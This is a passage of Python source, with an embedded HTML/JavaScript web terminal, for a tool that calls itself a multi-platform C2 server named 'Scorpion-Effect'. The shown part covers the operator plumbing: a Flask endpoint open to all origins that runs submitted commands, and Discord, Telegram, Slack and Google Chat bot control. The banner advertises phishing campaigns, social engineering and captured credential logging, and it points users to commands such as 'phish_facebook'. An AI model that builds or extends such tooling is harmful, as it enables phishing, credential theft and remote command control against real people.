        <div class="badge">⚡ CYBER COMMAND v2.0 | SECURE TERMINAL</div>
    </div>
    <div class="cyber-panels">
        <div class="command-section">
            <div class="terminal-window">
                <span>🦂 scorpion@cyber:~</span>
                <span style="flex:1; text-align:right;">[GREEN PHANTOM MODE]</span>
            </div>
            <div class="console-output" id="consoleOutput">
                <div>> Scorpion Effect Terminal active. [Secure]</div>
                <div>> Type 'help' for commands, 'phish_facebook' for phishing links</div>
                <div>> Try: 'status', 'scan', 'scorpion-strike'</div>
            </div>
            <div class="input-line">
                <span class="prompt-symbol">🦂➜</span>
                <input type="text" id="commandInput" placeholder="enter command..." autocomplete="off">
                <button class="btn-send" id="sendBtn">EXECUTE</button>
            </div>
        </div>
        <div class="game-section">
            <div class="game-header">🦂 SCORPION STINGER GAME</div>
            <div class="scorpion-dashboard">
                <div class="stinger-stats">
                    <span>⚡ STINGER CHARGE</span>
                    <span class="glowing-text" id="stingerCharge">100%</span>
                </div>
                <button class="scorpion-effect-btn" id="gameStrikeBtn">🔥 SCORPION STRIKE 🔥</button>
                <button class="scorpion-effect-btn" id="venomBoostBtn">💚 VENOM BOOST 💚</button>
                <div class="game-feedback" id="gameFeedback">🦂 Press Strike to unleash cyber scorpion effect.</div>
            </div>
        </div>
    </div>
</div>
<script>
    const consoleDiv = document.getElementById('consoleOutput');
    const commandInput = document.getElementById('commandInput');
    const sendBtn = document.getElementById('sendBtn');
    const stingerChargeSpan = document.getElementById('stingerCharge');
    const gameFeedbackSpan = document.getElementById('gameFeedback');
    
    let stingerCharge = 100;
    
    function updateStingerUI() {
        stingerChargeSpan.innerText = stingerCharge + '%';
        if (stingerCharge <= 25) stingerChargeSpan.style.color = "#ff7760";
        else if (stingerCharge <= 60) stingerChargeSpan.style.color = "#b3ff88";
        else stingerChargeSpan.style.color = "#2eff6e";
    }
    
    function addTerminalMessage(message, isError = false) {
        const msgDiv = document.createElement('div');
        msgDiv.innerHTML = `<span style="color: #6aff6a;">></span> ${message}`;
        consoleDiv.appendChild(msgDiv);
        consoleDiv.scrollTop = consoleDiv.scrollHeight;
        while (consoleDiv.children.length > 200) consoleDiv.removeChild(consoleDiv.firstChild);
    }
    
    async function sendCommand(cmd) {
        if (!cmd.trim()) return;
        addTerminalMessage(`$ ${cmd}`);
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const result = await response.json();
            if (result.success) {
                addTerminalMessage(result.output || 'Command executed successfully');
            } else {
                addTerminalMessage(`Error: ${result.output || 'Unknown error'}`, true);
            }
        } catch (e) {
            addTerminalMessage(`Connection error: ${e.message}`, true);
        }
    }
    
    sendBtn.addEventListener('click', () => {
        sendCommand(commandInput.value);
        commandInput.value = '';
        commandInput.focus();
    });
    
    commandInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendBtn.click();
    });
    
    function scorpionGameStrike() {
        if (stingerCharge >= 20) {
            stingerCharge = Math.max(0, stingerCharge - 10);
            updateStingerUI();
            gameFeedbackSpan.innerHTML = "🦂 SCORPION STRIKE! Venom splashes across terminal!";
            addTerminalMessage("🔥 GAME ACTION: Scorpion strikes with venomous tail!");
        } else {
            gameFeedbackSpan.innerHTML = "⚠️ Stinger energy too low! Wait for recharge.";
        }
        setTimeout(() => {
            if (stingerCharge < 100) {
                stingerCharge = Math.min(100, stingerCharge + 5);
                updateStingerUI();
            }
        }, 3000);
    }
    
    function venomBoostGame() {
        stingerCharge = Math.min(100, stingerCharge + 25);
        updateStingerUI();
        gameFeedbackSpan.innerHTML = "💚 VENOM BOOST ACTIVATED! Stinger overcharged!";
        addTerminalMessage("💚 Venom boost applied! All attacks amplified!");
    }
    
    document.getElementById('gameStrikeBtn').addEventListener('click', scorpionGameStrike);
    document.getElementById('venomBoostBtn').addEventListener('click', venomBoostGame);
    
    updateStingerUI();
    commandInput.focus();
    
    setInterval(() => {
        if (stingerCharge < 100 && Math.random() > 0.7) {
            stingerCharge = Math.min(100, stingerCharge + 3);
            updateStingerUI();
        }
    }, 5000);
</script>
</body>
</html>'''
    
    def __init__(self, handler: CommandHandler, port: int = 5000):
        self.handler = handler
        self.port = port
        self.app = None
        self.socketio = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup web server"""
        if not FLASK_AVAILABLE:
            return False
        
        self.app = Flask(__name__)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        @self.app.route('/')
        def index():
            return render_template_string(self.WEB_TEMPLATE)
        
        @self.app.route('/api/command', methods=['POST'])
        def handle_command():
            data = request.get_json()
            command = data.get('command', '')
            result = self.handler.execute_command(command, "web", "web")
            return jsonify({
                'success': result.get('success', False),
                'output': result.get('output', ''),
                'execution_time': result.get('execution_time', 0)
            })
        
        @self.app.route('/api/status', methods=['GET'])
        def get_status():
            return jsonify({'status': 'running', 'timestamp': datetime.datetime.now().isoformat()})
        
        return True
    
    def start(self):
        """Start web server"""
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.success(f'Web terminal started on port {self.port}')}")
            print(f"{Colors.info(f'Access at: http://{self._get_local_ip()}:{self.port}')}")
    
    def _run(self):
        """Run Flask server"""
        try:
            self.socketio.run(self.app, host='0.0.0.0', port=self.port, debug=False)
        except Exception as e:
            logger.error(f"Web server error: {e}")
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# MAIN APPLICATION
# =====================
class ScorpionEffect:
    """Main application class"""
    
    def __init__(self):
        # Load configuration
        self.config = self._load_config()
        
        # Initialize components
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db)
        
        # Initialize bots
        self.discord_bot = DiscordBot(self.handler, self.config, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.config, self.db)
        self.slack_bot = SlackBot(self.handler, self.config, self.db)
        self.google_chat_bot = GoogleChatBot(self.handler, self.config, self.db)
        self.web_terminal = WebTerminal(self.handler, self.config.get('web_port', 5000))
        
        self.running = True
    
    def _load_config(self) -> Dict:
        """Load configuration"""
        default_config = {
            'discord_token': '',
            'telegram_api_id': '',
            'telegram_api_hash': '',
            'telegram_bot_token': '',
            'slack_token': '',
            'slack_channel': 'general',
            'web_port': 5000,
            'enable_discord': False,
            'enable_telegram': False,
            'enable_slack': False,
            'enable_google_chat': False,
            'enable_web': True
        }
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    return {**default_config, **config}
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return default_config
    
    def save_config(self):
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
    
    def print_banner(self):
        """Print banner with scorpion theme"""
        banner = f"""
{Colors.GREEN_BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.GREEN_NEON}        🦂 SCORPION-EFFECT - Ultimate Multi-Platform C2 Server          {Colors.GREEN_BRIGHT}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN_LIME}  • Social Engineering Suite          • Multi-Platform Bot Integration   {Colors.GREEN_BRIGHT}║
║{Colors.GREEN_LIME}  • Phishing Campaigns                • Network Scanning (Nmap/Ping)      {Colors.GREEN_BRIGHT}║
║{Colors.GREEN_LIME}  • Traffic Generation                • IP Management & Blocking          {Colors.GREEN_BRIGHT}║
║{Colors.GREEN_LIME}  • Discord | Telegram | Slack | Google Chat | Web          {Colors.GREEN_BRIGHT}║
║{Colors.GREEN_LIME}  • Real-time Threat Detection        • Captured Credentials Logging      {Colors.GREEN_BRIGHT}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.VENOM}💚 Type '{Colors.GREEN_NEON}help{Colors.VENOM}' for command list{Colors.RESET}
{Colors.STINGER}⚡ Type '{Colors.GREEN_NEON}phish_facebook{Colors.STINGER}' to generate a phishing link{Colors.RESET}
{Colors.GREEN_LIME}🌐 Web terminal: http://localhost:{self.config.get('web_port', 5000)}{Colors.RESET}
"""
        print(banner)
    
    def setup_bots(self):
        """Setup and start bots"""
        print(f"\n{Colors.GREEN_NEON}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.GREEN_DARK}{'='*50}{Colors.RESET}")
        
        # Discord
        if not self.config.get('discord_token') and not self.config.get('enable_discord'):
            token = input(f"{Colors.GREEN_LIME}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['discord_token'] = token
                self.config['enable_discord'] = True
                self.save_config()
        
        if self.config.get('discord_token') and self.discord_bot.setup():
            self.discord_bot.start()
            print(f"{Colors.success('Discord bot starting...')}")
        
        # Telegram
        if not self.config.get('telegram_api_id') and not self.config.get('enable_telegram'):
            api_id = input(f"{Colors.GREEN_LIME}Enter Telegram API ID (or press Enter to skip): {Colors.RESET}").strip()
            if api_id:
                self.config['telegram_api_id'] = api_id
                self.config['telegram_api_hash'] = input(f"{Colors.GREEN_LIME}Enter Telegram API Hash: {Colors.RESET}").strip()
                self.config['telegram_bot_token'] = input(f"{Colors.GREEN_LIME}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
                self.config['enable_telegram'] = True
                self.save_config()
        
        if self.config.get('telegram_api_id') and self.telegram_bot.setup():
            self.telegram_bot.start()
            print(f"{Colors.success('Telegram bot starting...')}")
        
        # Slack
        if not self.config.get('slack_token') and not self.config.get('enable_slack'):
            token = input(f"{Colors.GREEN_LIME}Enter Slack bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['slack_token'] = token
                self.config['slack_channel'] = input(f"{Colors.GREEN_LIME}Enter Slack channel name (default: general): {Colors.RESET}").strip() or 'general'
                self.config['enable_slack'] = True
                self.save_config()
        
        if self.config.get('slack_token') and self.slack_bot.setup():
            self.slack_bot.start()
            print(f"{Colors.success('Slack bot starting...')}")
        
        # Google Chat
        if not self.config.get('enable_google_chat'):
            enable = input(f"{Colors.GREEN_LIME}Enable Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
            if enable == 'y':
                self.config['enable_google_chat'] = True
                webhook_name = input(f"{Colors.GREEN_LIME}Enter webhook name: {Colors.RESET}").strip()
                webhook_url = input(f"{Colors.GREEN_LIME}Enter Google Chat webhook URL: {Colors.RESET}").strip()
                if webhook_url:
                    self.google_chat_bot.add_webhook(webhook_name, webhook_url)
                self.save_config()
        
        if self.config.get('enable_google_chat') and self.google_chat_bot.setup():
            self.google_chat_bot.start()
            print(f"{Colors.success('Google Chat bot configured')}")
        
        # Web Terminal
        if self.config.get('enable_web', True):
            self.web_terminal.start()
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.setup_bots()
        
        print(f"\n{Colors.success('System ready! Type help for commands.')}")
        print(f"{Colors.info('Web terminal: http://localhost:{}'.format(self.config.get('web_port', 5000)))}")
        print(f"{Colors.venom('Specialized phishing: phish_facebook, phish_instagram, phish_twitter, etc.')}\n")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.GREEN_BRIGHT}🦂{Colors.RESET} "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.warning('Goodbye!')}")
                    break
                
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                    continue
                
                result = self.handler.execute_command(command)
                
                if result.get('success'):
                    output = result.get('output', '')
                    if output == 'CLEAR':
                        os.system('cls' if os.name == 'nt' else 'clear')
                        self.print_banner()
                    elif output == 'EXIT':
                        self.running = False
                        print(f"{Colors.warning('Goodbye!')}")
                        break
                    else:
                        print(output)
                        if result.get('execution_time'):
                            print(f"\n{Colors.success('Executed in {:.2f}s'.format(result['execution_time']))}")
                else:
                    print(f"{Colors.error(result.get('output', 'Unknown error'))}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.warning('Exiting...')}")
                self.running = False
            except Exception as e:
                print(f"{Colors.error(f'Error: {e}')}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.db.close()
        print(f"\n{Colors.success('Shutdown complete.')}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        if sys.version_info < (3, 7):
            print(f"{Colors.error('Python 3.7 or higher required')}")
            sys.exit(1)
        
        app = ScorpionEffect()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.warning('Goodbye!')}")
    except Exception as e:
        print(f"\n{Colors.error(f'Fatal error: {e}')}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()